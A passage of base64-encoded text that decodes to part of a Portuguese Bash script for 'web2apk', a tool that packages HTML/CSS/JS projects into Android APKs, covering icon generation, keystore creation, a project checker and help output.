Blcm1pc3Npb24uQk9EWV9TRU5TT1JTJyA7OwogICAgICAqKSAgICAgICAgICAgICAgICAgICAgICAgZWNobyAiJHAiIDs7CiAgICBlc2FjCiAgZG9uZQp9Cl9nZW5faWNvbigpIHsKICBsb2NhbCBkc3Q9IiQxIiBzej0iJHsyOi0xOTJ9IgogIHB5dGhvbjMgLWMgIgppbXBvcnQgc3RydWN0LHpsaWIKZHN0LHN6PSckZHN0JyxpbnQoJyRzeicgaWYgJyRzeicgZWxzZSAnMTkyJykKcixnLGI9MjYsMTE1LDIzMgpkZWYgY2h1bmsobixkKToKIGM9emxpYi5jcmMzMihuK2QpJjB4ZmZmZmZmZmYKIHJldHVybiBzdHJ1Y3QucGFjaygnPkknLGxlbihkKSkrbitkK3N0cnVjdC5wYWNrKCc+SScsYykKcmF3PWInJwpmb3IgXyBpbiByYW5nZShzeik6IHJhdys9YidcXHgwMCcrYnl0ZXMoW3IsZyxiLDI1NV0qc3opCnBuZz1iJ1xceDg5UE5HXFxyXFxuXFx4MWFcXG4nK2NodW5rKGInSUhEUicsc3RydWN0LnBhY2soJz5JSUJCQkJCJyxzeixzeiw4LDYsMCwwLDApKStjaHVuayhiJ0lEQVQnLHpsaWIuY29tcHJlc3MocmF3LDYpKStjaHVuayhiJ0lFTkQnLGInJykKb3Blbihkc3QsJ3diJykud3JpdGUocG5nKQoiIDI+L2Rldi9udWxsCn0KX3Jlc2l6ZV9pY29uKCkgewogIGxvY2FsIHNyYz0iJDEiIGRzdD0iJDIiIHN6PSIkMyIKICBta2RpciAtcCAiJChkaXJuYW1lICIkZHN0IikiCiAgcHl0aG9uMyAtYyAiCmltcG9ydCBzeXMsc2h1dGlsCnRyeToKIGZyb20gUElMIGltcG9ydCBJbWFnZQogSW1hZ2Uub3BlbignJHNyYycpLmNvbnZlcnQoJ1JHQkEnKS5yZXNpemUoKGludCgnJHN6JyksaW50KCckc3onKSksSW1hZ2UuTEFOQ1pPUykuc2F2ZSgnJGRzdCcpCmV4Y2VwdDogc2h1dGlsLmNvcHkoJyRzcmMnLCckZHN0JykKIiAyPi9kZXYvbnVsbCB8fCBjcCAiJHNyYyIgIiRkc3QiCn0KX2Vuc3VyZV9rZXlzdG9yZSgpIHsKICBbIC1mICIkVzJBX0tTIiBdICYmIHJldHVybgogIF9pbmZvICdHZXJhbmRvIGtleXN0b3JlLi4uJwogIG1rZGlyIC1wICIkKGRpcm5hbWUgIiRXMkFfS1MiKSIKICBrZXl0b29sIC1nZW5rZXlwYWlyIC12IC1rZXlzdG9yZSAiJFcyQV9LUyIgLWFsaWFzIHdlYjJhcGsgLWtleWFsZyBFQyAta2V5c2l6ZSAyNTYgLXZhbGlkaXR5IDEwMDAwIC1zdG9yZXBhc3Mgd2ViMmFway1rZXkgLWtleXBhc3Mgd2ViMmFway1rZXkgLWRuYW1lICdDTj13ZWIyYXBrLCBPPUVsbGlvdE9TLCBDPUJSJyAyPi9kZXYvbnVsbCAmJiBfb2sgJ0tleXN0b3JlIGNyaWFkYScKfQoKIyDilIDilIAgX2NtZF9jaGVja19wcm9qZWN0IOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgApfY21kX2NoZWNrX3Byb2plY3QoKSB7CiAgbG9jYWwgRElSPSIkMSIKICBsb2NhbCBCPSdcMDMzWzE7MzRtJyBZPSdcMDMzWzE7MzNtJyBSPSdcMDMzWzE7MzFtJyBOPSdcMDMzWzBtJyBEPSdcMDMzWzA7OTBtJwogIFsgLXogIiRESVIiIF0gJiYgeyBfY21kX2hlbHA7IGV4aXQgMTsgfQogIFsgLWQgIiRESVIiIF0gfHwgX2VyciAiRGlyZXTDs3JpbyBuw6NvIGVuY29udHJhZG86ICRESVIiCgogIHByaW50ZiAiXG5cMDMzWzE7MzVtICA9PSB3ZWIyYXBrIGNoZWNrOiAlcyA9PVwwMzNbMG1cblxuIiAiJERJUiIKCiAgbG9jYWwgdG90YWwgaHRtbF9uIGNzc19uIGpzX24gb3RoZXJfbgogIHRvdGFsPSQoZmluZCAiJERJUiIgLXR5cGUgZiB8IHdjIC1sKQogIGh0bWxfbj0kKGZpbmQgIiRESVIiIC10eXBlIGYgLWluYW1lICIqLmh0bWwiIHwgd2MgLWwpCiAgY3NzX249JChmaW5kICAiJERJUiIgLXR5cGUgZiAtaW5hbWUgIiouY3NzIiAgfCB3YyAtbCkKICBqc19uPSQoZmluZCAgICIkRElSIiAtdHlwZSBmIC1pbmFtZSAiKi5qcyIgICB8IHdjIC1sKQogIG90aGVyX249JCgodG90YWwgLSBodG1sX24gLSBjc3NfbiAtIGpzX24pKQogIHByaW50ZiAiICAke0R9JWQgYXJxdWl2byhzKTogJWQgSFRNTCAgJWQgQ1NTICAlZCBKUyAgJWQgb3V0cm9zJHtOfVxuXG4iIFwKICAgICIkdG90YWwiICIkaHRtbF9uIiAiJGNzc19uIiAiJGpzX24iICIkb3RoZXJfbiIKCiAgbG9jYWwgZmF0YWxzPTAgd2FybnM9MCBva3M9MAoKICAjIOKUgOKUgCBpbmRleC5odG1sIOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgAogIGlmIFsgISAtZiAiJERJUi9pbmRleC5odG1sIiBdOyB0aGVuCiAgICBwcmludGYgIiAgJHtSfVtGQVRBTF0gaW5kZXguaHRtbCBhdXNlbnRlIOKAlCBvIEFQSyBuw6NvIHZhaSBjb21waWxhciR7Tn1cbiIKICAgIGZhdGFscz0kKChmYXRhbHMrMSkpCiAgZWxzZQogICAgcHJpbnRmICIgICR7Qn1bT0tdICAgIGluZGV4Lmh0bWwgcHJlc2VudGUke059XG4iOyBva3M9JCgob2tzKzEpKQogICAgbG9jYWwgaHRtbDsgaHRtbD0kKGNhdCAiJERJUi9pbmRleC5odG1sIikKCiAgICAjIERPQ1RZUEUKICAgIGlmICEgcHJpbnRmICclcycgIiRodG1sIiB8IGdyZXAgLXFpICc8IWRvY3R5cGUgaHRtbD4nOyB0aGVuCiAgICAgIHByaW50ZiAiICAke1J9W0ZBVEFMXSBTZW0gPCFET0NUWVBFIGh0bWw+IOKAlCBXZWJWaWV3IHBvZGUgcmVqZWl0YXIgYSBww6FnaW5hJHtOfVxuIgogICAgICBmYXRhbHM9JCgoZmF0YWxzKzEpKQogICAgZWxzZQogICAgICBwcmludGYgIiAgJHtCfVtPS10gICAgPCFET0NUWVBFIGh0bWw+IHByZXNlbnRlJHtOfVxuIjsgb2tzPSQoKG9rcysxKSkKICAgIGZpCgogICAgIyBjaGFyc2V0CiAgICBpZiAhIHByaW50ZiAnJXMnICIkaHRtbCIgfCBncmVwIC1xaSAnY2hhcnNldCc7IHRoZW4KICAgICAgcHJpbnRmICIgICR7Un1bRkFUQUxdIFNlbSA8bWV0YSBjaGFyc2V0PiDigJQgYWNlbnRvcyBxdWVicmFkb3Mgbm8gQVBLJHtOfVxuIgogICAgICBmYXRhbHM9JCgoZmF0YWxzKzEpKQogICAgZWxzZQogICAgICBwcmludGYgIiAgJHtCfVtPS10gICAgY2hhcnNldCBwcmVzZW50ZSR7Tn1cbiI7IG9rcz0kKChva3MrMSkpCiAgICBmaQoKICAgICMgdmlld3BvcnQKICAgIGlmICEgcHJpbnRmICclcycgIiRodG1sIiB8IGdyZXAgLXFpICduYW1lPSJ2aWV3cG9ydCInOyB0aGVuCiAgICAgIHByaW50ZiAiICAke1J9W0ZBVEFMXSBTZW0gPG1ldGEgbmFtZT1cInZpZXdwb3J0XCI+IOKAlCBsYXlvdXQgdmFpIHF1ZWJyYXIgbm8gQW5kcm9pZCR7Tn1cbiIKICAgICAgZmF0YWxzPSQoKGZhdGFscysxKSkKICAgIGVsc2UKICAgICAgcHJpbnRmICIgICR7Qn1bT0tdICAgIHZpZXdwb3J0IHByZXNlbnRlJHtOfVxuIjsgb2tzPSQoKG9rcysxKSkKICAgIGZpCgogICAgIyBjYW1pbmhvIGRvIHNpc3RlbWEgKGZhdGFsKQogICAgaWYgcHJpbnRmICclcycgIiRodG1sIiB8IGdyZXAgLXFpRSAnKHNyY3xocmVmKT0uKigvaG9tZS98L3Jvb3QvfC9zZGNhcmQvKSc7IHRoZW4KICAgICAgcHJpbnRmICIgICR7Un1bRkFUQUxdIENhbWluaG8gYWJzb2x1dG8gZG8gc2lzdGVtYSBkZXRlY3RhZG8gKGV4OiAvaG9tZS91c2VyL2ltZy5wbmcpIOKAlCBuw6NvIGZ1bmNpb25hIG5vIEFQSyR7Tn1cbiIKICAgICAgZmF0YWxzPSQoKGZhdGFscysxKSkKICAgIGZpCgogICAgIyA8c2NyaXB0PiBubyA8aGVhZD4gc2VtIGRlZmVyL2FzeW5jL0RPTUNvbnRlbnRMb2FkZWQKICAgIGxvY2FsIGhlYWRfYmxvY2s7IGhlYWRfYmxvY2s9JChwcmludGYgJyVzJyAiJGh0bWwiIHwgc2VkIC1uICdzL1woLipcKS9cMS9wJyB8IGdyZXAgLWkgJzxoZWFkPicgfCBoZWFkIC0xKQogICAgbG9jYWwgaW5faGVhZDsgaW5faGVhZD0kKHByaW50ZiAnJXMnICIkaHRtbCIgfCBhd2sgJ0JFR0lOe3A9MH0gLzxoZWFkLywvPFwvaGVhZD4ve3A9MX0gcHtwcmludH0gLzxcL2hlYWQ+L3twPTB9JykKICAgIGlmIHByaW50ZiAnJXMnICIkaW5faGVhZCIgfCBncmVwIC1xaSAnPHNjcmlwdCcgJiYgXAogICAgICAgISBwcmludGYgJyVzJyAiJGluX2hlYWQiIHwgZ3JlcCAtcWlFICdkZWZlcnxhc3luY3xET01Db250ZW50TG9hZGVkJzsgdGhlbgogICAgICBwcmludGYgIiAgJHtZfVtXQVJOXSAgPHNjcmlwdD4gbm8gPGhlYWQ+IHNlbSBkZWZlci9hc3luYyDigJQgcG9kZSBleGVjdXRhciBhbnRlcyBkbyBET00gZXN0YXIgcHJvbnRvJHtOfVxuIgogICAgICB3YXJucz0kKCh3YXJucysxKSkKICAgIGZpCgogICAgIyByZWN1cnNvIGV4dGVybm8gKFVSTCkgZW0gbGluay9zY3JpcHQKICAgIGlmIHByaW50ZiAnJXMnICIkaHRtbCIgfCBncmVwIC1xaUUgJzwobGlua3xzY3JpcHQpW14+XStodHRwcz86Ly8nOyB0aGVuCiAgICAgIHByaW50ZiAiICAke1l9W1dBUk5dICBSZWN1cnNvIGV4dGVybm8gdmlhIFVSTCBlbSA8bGluaz4vPHNjcmlwdD4g4oCUIG7Do28gZnVuY2lvbmEgb2ZmbGluZSR7Tn1cbiIKICAgICAgd2FybnM9JCgod2FybnMrMSkpCiAgICBmaQoKICAgICMgR29vZ2xlIEZvbnRzIGlubGluZQogICAgaWYgcHJpbnRmICclcycgIiRodG1sIiB8IGdyZXAgLXFpICdmb250cy5nb29nbGVhcGlzXHxmb250cy5nc3RhdGljJzsgdGhlbgogICAgICBwcmludGYgIiAgJHtZfVtXQVJOXSAgR29vZ2xlIEZvbnRzIHZpYSBDRE4g4oCUIG7Do28gY2FycmVnYSBzZW0gaW50ZXJuZXQsIHVzZSBAZm9udC1mYWNlIGxvY2FsJHtOfVxuIgogICAgICB3YXJucz0kKCh3YXJucysxKSkKICAgIGZpCgogICAgIyBjYW1pbmhvIGFic29sdXRvIChhdmlzbykKICAgIGlmIHByaW50ZiAnJXMnICIkaHRtbCIgfCBncmVwIC1xaUUgJyhzcmN8aHJlZik9Ii9bXi8iXSc7IHRoZW4KICAgICAgcHJpbnRmICIgICR7WX1bV0FSTl0gIENhbWluaG8gYWJzb2x1dG8gZGV0ZWN0YWRvIChleDogc3JjPVwiL2ltZ1wiKSDigJQgdXNlIGNhbWluaG9zIHJlbGF0aXZvcyR7Tn1cbiIKICAgICAgd2FybnM9JCgod2FybnMrMSkpCiAgICBmaQogIGZpCgogICMg4pSA4pSAIENTUyDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIAKICBpZiBbICIkY3NzX24iIC1ndCAwIF07IHRoZW4KICAgIGZpbmQgIiRESVIiIC10eXBlIGYgLWluYW1lICIqLmNzcyIgfCBzb3J0IHwgd2hpbGUgcmVhZCAtciBmOyBkbwogICAgICBsb2NhbCBmbjsgZm49JChiYXNlbmFtZSAiJGYiKQogICAgICBsb2NhbCBjc3M7IGNzcz0kKGNhdCAiJGYiKQoKICAgICAgaWYgcHJpbnRmICclcycgIiRjc3MiIHwgZ3JlcCAtcWlFICJAaW1wb3J0XHMrdXJsXHMqXChccypbJ1wiXT9odHRwcz86Ly8iOyB0aGVuCiAgICAgICAgcHJpbnRmICIgICR7WX1bV0FSTl0gICVzOiBAaW1wb3J0IFVSTCBleHRlcm5hIOKAlCBuw6NvIGZ1bmNpb25hIG9mZmxpbmUgbm8gQVBLJHtOfVxuIiAiJGZuIgogICAgICBmaQogICAgICBpZiBwcmludGYgJyVzJyAiJGNzcyIgfCBncmVwIC1xaSAnZm9udHMuZ29vZ2xlYXBpc1x8Zm9udHMuZ3N0YXRpYyc7IHRoZW4KICAgICAgICBwcmludGYgIiAgJHtZfVtXQVJOXSAgJXM6IEdvb2dsZSBGb250cyB2aWEgQGltcG9ydCDigJQgYmFpeGUgbyAudHRmIGUgdXNlIEBmb250LWZhY2Uke059XG4iICIkZm4iCiAgICAgIGZpCiAgICAgIGxvY2FsIHB4X2M7IHB4X2M9JChwcmludGYgJyVzJyAiJGNzcyIgfCBncmVwIC1jRSAnZm9udC1zaXplXHMqOlxzKlswLTldK3B4JyAyPi9kZXYvbnVsbCB8fCB0cnVlKQogICAgICBpZiBbICIke3B4X2M6LTB9IiAtZ3QgNSBdOyB0aGVuCiAgICAgICAgcHJpbnRmICIgICR7WX1bV0FSTl0gICVzOiAlZCBmb250LXNpemUgZW0gcHggZml4byDigJQgcHJlZmlyYSByZW0vdncgcGFyYSBlc2NhbGFyIG5vIEFuZHJvaWQke059XG4iICIkZm4iICIkcHhfYyIKICAgICAgZmkKICAgIGRvbmUKICBmaQoKICAjIOKUgOKUgCBKUyDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIAKICBpZiBbICIkanNfbiIgLWd0IDAgXTsgdGhlbgogICAgZmluZCAiJERJUiIgLXR5cGUgZiAtaW5hbWUgIiouanMiIHwgc29ydCB8IHdoaWxlIHJlYWQgLXIgZjsgZG8KICAgICAgbG9jYWwgZm47IGZuPSQoYmFzZW5hbWUgIiRmIikKICAgICAgbG9jYWwganM7IGpzPSQoY2F0ICIkZiIpCgogICAgICBpZiBwcmludGYgJyVzJyAiJGpzIiB8IGdyZXAgLXFpRSAiZmV0Y2hccypcKFxzKlsnXCJdaHR0cHM/Oi8vIjsgdGhlbgogICAgICAgIHByaW50ZiAiICAke1l9W1dBUk5dICAlczogZmV0Y2goKSBwYXJhIFVSTCBleHRlcm5hIOKAlCBwb2RlIGZhbGhhciBwb3IgQ09SUyBubyBXZWJWaWV3JHtOfVxuIiAiJGZuIgogICAgICBmaQogICAgICBpZiBwcmludGYgJyVzJyAiJGpzIiB8IGdyZXAgLXFpRSAiaW1wb3J0XHMrLipmcm9tXHMrWydcIl1odHRwcz86Ly8iOyB0aGVuCiAgICAgICAgcHJpbnRmICIgICR7WX1bV0FSTl0gICVzOiBpbXBvcnQgZGUgVVJMIGV4dGVybmEg4oCUIG7Do28gZnVuY2lvbmEgbm8gV2ViVmlldyR7Tn1cbiIgIiRmbiIKICAgICAgZmkKICAgICAgaWYgcHJpbnRmICclcycgIiRqcyIgfCBncmVwIC1xaSAnbmF2aWdhdG9yXC5nZW9sb2NhdGlvbic7IHRoZW4KICAgICAgICBwcmludGYgIiAgJHtZfVtXQVJOXSAgJXM6IGdlb2xvY2F0aW9uIOKAlCBhZGljaW9uZSAtLXBlcm0gbG9jYXRpb24gbm8gd2ViMmFwayBidWlsZCR7Tn1cbiIgIiRmbiIKICAgICAgZmkKICAgICAgaWYgcHJpbnRmICclcycgIiRqcyIgfCBncmVwIC1xaSAnZG9jdW1lbnRcLndyaXRlXGInOyB0aGVuCiAgICAgICAgcHJpbnRmICIgICR7WX1bV0FSTl0gICVzOiBkb2N1bWVudC53cml0ZSgpIOKAlCBwb2RlIGNvcnJvbXBlciBvIGxheW91dCBubyBXZWJWaWV3JHtOfVxuIiAiJGZuIgogICAgICBmaQogICAgZG9uZQogIGZpCgogICMg4pSA4pSAIFN1Z2VzdMO1ZXMgZGUgbWVsaG9yaWEg4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSACiAgcHJpbnRmICJcbiAgJHtEfeKUgOKUgCBTdWdlc3TDtWVzIOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgCR7Tn1cbiIKICBpZiBbICEgLWYgIiRESVIvc3R5bGUuY3NzIiBdOyB0aGVuCiAgICBwcmludGYgIiAgJHtEfVtESUNBXSAgU2VtIHN0eWxlLmNzcyBuYSByYWl6IOKAlCB1c2UgcGFyYSBjZW50cmFsaXphciBlc3RpbG9zJHtOfVxuIgogIGZpCiAgaWYgWyAhIC1mICIkRElSL3NjcmlwdC5qcyIgXTsgdGhlbgogICAgcHJpbnRmICIgICR7RH1bRElDQV0gIFNlbSBzY3JpcHQuanMgbmEgcmFpeiDigJQgY2VudHJhbGl6ZSBhIGzDs2dpY2EgSlMgYXF1aSR7Tn1cbiIKICBmaQogIGlmIGZpbmQgIiRESVIiIC10eXBlIGYgLWluYW1lICIqLnBuZyIgLW8gLWluYW1lICIqLmpwZyIgLW8gLWluYW1lICIqLmpwZWciIHwgZ3JlcCAtcSAuOyB0aGVuCiAgICBsb2NhbCBpbWdfc2l6ZTsgaW1nX3NpemU9JChmaW5kICIkRElSIiAtdHlwZSBmIFwoIC1pbmFtZSAiKi5wbmciIC1vIC1pbmFtZSAiKi5qcGciIC1vIC1pbmFtZSAiKi5qcGVnIiBcKSBcCiAgICAgIC1leGVjIGR1IC1rIHt9IFw7IDI+L2Rldi9udWxsIHwgYXdrICd7cys9JDF9RU5Ee3ByaW50IHMrMH0nKQogICAgaWYgWyAiJHtpbWdfc2l6ZTotMH0iIC1ndCAyMDQ4IF07IHRoZW4KICAgICAgcHJpbnRmICIgICR7RH1bRElDQV0gIEltYWdlbnMgcGVzYWRhcyAoPjJNQiB0b3RhbCkg4oCUIGNvbnNpZGVyZSBjb21wcmVzc8OjbyBwYXJhIHJlZHV6aXIgbyBBUEske059XG4iCiAgICBmaQogIGZpCgogICMg4pSA4pSAIFJlc3VtbyDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIAKICBwcmludGYgIlxuICAke0R94pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSAJHtOfVxuIgogIGlmIFsgIiRmYXRhbHMiIC1lcSAwIF0gJiYgWyAiJHdhcm5zIiAtZXEgMCBdOyB0aGVuCiAgICBwcmludGYgIiAgJHtCfVByb2pldG8gbGltcG8g4oCUICVkIHZlcmlmaWNhw6fDtWVzIE9LLiBQcm9udG8gcGFyYSBjb21waWxhci4ke059XG5cbiIgIiRva3MiCiAgZWxpZiBbICIkZmF0YWxzIiAtZXEgMCBdOyB0aGVuCiAgICBwcmludGYgIiAgJHtZfSVkIGF2aXNvKHMpIOKAlCBwb2RlIGNvbXBpbGFyLCBtYXMgcmV2aXNlIGFudGVzLiR7Tn1cbiIgIiR3YXJucyIKICAgIHByaW50ZiAiICAke0J9JWQgdmVyaWZpY2HDp8OjbyjDtWVzKSBPSyR7Tn1cblxuIiAiJG9rcyIKICBlbHNlCiAgICBwcmludGYgIiAgJHtSfSVkIGVycm8ocykgZmF0YWwoaXMpIOKAlCBOw4NPIHZhaSBjb21waWxhci4ke059XG4iICIkZmF0YWxzIgogICAgWyAiJHdhcm5zIiAtZ3QgMCBdICYmIHByaW50ZiAiICAke1l9JWQgYXZpc28ocykke059XG4iICIkd2FybnMiCiAgICBwcmludGYgIiAgJHtCfSVkIHZlcmlmaWNhw6fDo28ow7VlcykgT0ske059XG5cbiIgIiRva3MiCiAgZmkKfQpfY21kX2NoZWNrKCkgewogICMgU2UgcmVjZWJlciB1bSBkaXJldMOzcmlvIGNvbW8gYXJndW1lbnRvLCBmYXogY2hlY2sgZG8gcHJvamV0bwogIGlmIFsgLW4gIiQxIiBdICYmIFsgLWQgIiQxIiBdOyB0aGVuCiAgICBfY21kX2NoZWNrX3Byb2plY3QgIiQxIgogICAgcmV0dXJuCiAgZmkKICAjIFNlbSBhcmd1bWVudG86IHZlcmlmaWNhIGFzIGZlcnJhbWVudGFzIGRlIGJ1aWxkCiAgX2hlYWQgJ3dlYjJhcGsgY2hlY2snCiAgbG9jYWwgb2s9MQogIGZvciBjbWQgaW4gYWFwdDIgZWNqIGR4IGFwa3NpZ25lciB6aXBhbGlnbiBweXRob24zIGtleXRvb2w7IGRvCiAgICBjb21tYW5kIC12ICIkY21kIiA+L2Rldi9udWxsIDI+JjEgJiYgX29rICIkY21kIiB8fCB7IF93YXJuICIkY21kIG5hbyBlbmNvbnRyYWRvIjsgb2s9MDsgfQogIGRvbmUKICBbIC1mICIkVzJBX0pBUiIgXSAmJiBfb2sgImFuZHJvaWQuamFyIC0+ICRXMkFfSkFSIiB8fCB7IF93YXJuICdhbmRyb2lkLmphciBhdXNlbnRlIC0tIHhwbSBpbnN0YWxsIHdlYjJhcGsnOyBvaz0wOyB9CiAgWyAiJG9rIiAtZXEgMSBdICYmIHByaW50ZiAnXG5cMDMzWzE7MzJtICBUdWRvIHByb250by5cMDMzWzBtXG5cbicgfHwgcHJpbnRmICdcblwwMzNbMTszM20gIEluc3RhbGUgb3MgaXRlbnMgYWNpbWEuXDAzM1swbVxuXG4nCn0KX2NtZF9oZWxwKCkgewogIHByaW50ZiAnXG5cMDMzWzE7MzVtICB3ZWIyYXBrIHYlcyAtLSBFbGxpb3RPUyBIVE1ML0NTUy9KUyA8LT4gQVBLXDAzM1swbVxuXG4nICIkVkVSU0lPTiIKICBwcmludGYgJyAgXDAzM1sxOzMybVVzbzpcMDMzWzBtXG4nCiAgcHJpbnRmICcgICAgd2ViMmFwayBidWlsZCA8ZGlyPiBbb3Bjb2VzXSAgICAgXDAzM1swOzkwbSMgV2ViIC0+IEFQS1wwMzNbMG1cbicKICBwcmludGYgJyAgICB3ZWIyYXBrIGJ1aWxkIC0tdXJsIDxodHRwczovLy4uLj4gW29wY29lc11cbicKICBwcmludGYgJyAgICB3ZWIyYXBrIGFwazJ3ZWIgPGFycXVpdm8uYXBrPiBbZGlyX3NhaWRhXSAgXDAzM1swOzkwbSMgQVBLIC0+IFdlYlwwMzNbMG1cbicKICBwcmludGYgJyAgICB3ZWIyYXBrIGNoZWNrICAgICAgICAgICAgICAgXDAzM1swOzkwbSMgdmVyaWZpY2EgZmVycmFtZW50YXMgZGUgYnVpbGRcMDMzWzBtXG4nCiAgcHJpbnRmICcgICAgd2ViMmFwayBjaGVjayA8ZGlyPiAgICAgICAgIFwwMzNbMDs5MG0jIGFuYWxpc2EgcHJvamV0bzogZXJyb3MsIGF2aXNvcywgY29udGFnZW0gZGUgYXJxdWl2b3NcMDMzWzBtXG5cbicKICBwcmludGYgJyAgXDAzM1sxOzMybU11bHRpcGxvcyBhcnF1aXZvcyAoYnVpbGQpOlwwMzNbMG1cbicKICBwcmludGYgJyAgICBcMDMzWzA7OTBtTyBkaXJldG9yaW8gcG9kZSBjb250ZXIgcXVhbnRvcyAuaHRtbCAuY3NzIC5qcyBxdWlzZXIuXDAzM1swbVxuJwogIHByaW50ZiAnICAgIFwwMzNbMDs5MG1Ub2RvcyBzYW8gZW1wYWNvdGFkb3Mgbm8gQVBLLiBpbmRleC5odG1sIGUgbyBwb250byBkZSBlbnRyYWRhLlwwMzNbMG1cbicKICBwcmludGYgJyAgICBcMDMzWzA7OTBtU3VicGFzdGFzIHRhbWJlbSBzYW8gaW5jbHVpZGFzIChhc3NldHMvLCBwYWdlcy8sIGV0YykuXDAzM1swbVxuXG4nCiAgcHJpbnRmICcgIFwwMzNbMTszMm1PcGNvZXMgZGUgYnVpbGQ6XDAzM1swbVxuJwogIHByaW50ZiAnICAgIC0tbmFtZSBcIk5vbWVcIiAgICAgICAgICBOb21lIGV4aWJpZG9cbicKICBwcmludGYgJyAgICAtLXBrZ25hbWUgY29tLnBrZy5pZCAgIFBhY2thZ2UgSURcbicKICBwcmludGYgJyAgICAtLWljb24gL3BhdGgvaWNvbi5wbmcgIEljb25lIFBORyBsYXVuY2hlclxuJwogIHByaW50ZiAnICAgIC0tb3V0IC9wYXRoL2FwcC5hcGsgICAgU2FpZGFcbicKICBwcmludGYgJyAgICAtLXBlcm0gY2FtLG1pYywuLi4gICAgIFBlcm1pc3NvZXMgcG9yIHZpcmd1bGFcbicKICBwcmludGYgJyAgICAtLXZlcnNpb24gXCIxLjBcIiAgICAgICAgVmVyc2lvbiBuYW1lXG4nCiAgcHJpbnRmICcgICAgLS12ZXJzaW9uY29kZSBOICAgICAgICBWZXJzaW9uIGNvZGVcbicKICBwcmludGYgJyAgICAtLW1pbi1zZGsgTiAgICAgICAgICAgIE1pbiBTREsgKHBhZHJhbyAyMSlcbicKICBwcmludGYgJyAgICAtLXRhcmdldC1zZGsgTiAgICAgICAgIFRhcmdldCBTREsgKHBhZHJhbyAzMylcbicKICBwcmludGYgJyAgICAtLW9yaWVudGF0aW9uIHBvcnRyYWl0fGxhbmRzY2FwZXxhdXRvXG4nCiAgcHJpbnRmICcgICAgLS1mdWxsc2NyZWVuICAgICAgICAgICBFc2NvbmRlIHN0YXR1cyBiYXJcbicKICBwcmludGYgJyAgICAtLXRoZW1lIGRhcmt8bGlnaHR8dHJhbnNwYXJlbnRcbicKICBwcmludGYgJyAgICAtLXVybCBodHRwczovLy4uLiAgICAgIENhcnJlZ2EgVVJMIHJlbW90YVxuJwogIHByaW50ZiAnICAgIC0tbm8taW50ZXJuZXQgICAgICAgICAgU2VtIElOVEVSTkVUIGF1dG9tYXRpY2FcblxuJwogIHByaW50ZiAnICBcMDMzWzE7MzJtT3Bjb2VzIGRlIGFwazJ3ZWI6XDAzM1swbVxuJwogIHByaW50ZiAnICAgIHdlYjJhcGsgYXBrMndlYiBhcHAuYXBrICAgICAgICAgICBcMDMzWzA7OTBtIyBleHRyYWkgcGFyYSAuL2FwcF93ZWIvXDAzM1swbVxuJwogIHByaW50ZiAnICAgIHdlYjJhcGsgYXBrMndlYiBhcHAuYXBrIC4vc2FpZGEvICBcMDMzWzA7OTBtIyBleHRyYWkgcGFyYSBkaXJldG9yaW8gZXNjb2xoaWRvXDAzM1swbVxuJwogIHByaW50ZiAnICAgIHdlYjJhcGsgYXBrMndlYiBhcHAuYXBrIC0tZm9yY2UgICBcMDMzWzA7OTBtIyBzb2JyZXNjcmV2ZSBzZSBqYSBleGlzdGlyXDAzM1swbVxuXG4nCiAgcHJpbnRmICcgIFwwMzNbMTszMm1QZXJtaXNzb2VzOlwwMzNbMG1cbicKICBwcmludGYgJyAgICBcMDMzWzA7OTBtaW50ZXJuZXQgY2FtZXJhIG1pYyBzdG9yYWdlIGxvY2F0aW9uIHZpYnJhdGUgYmx1ZXRvb3RoIG5mYyBjb250YW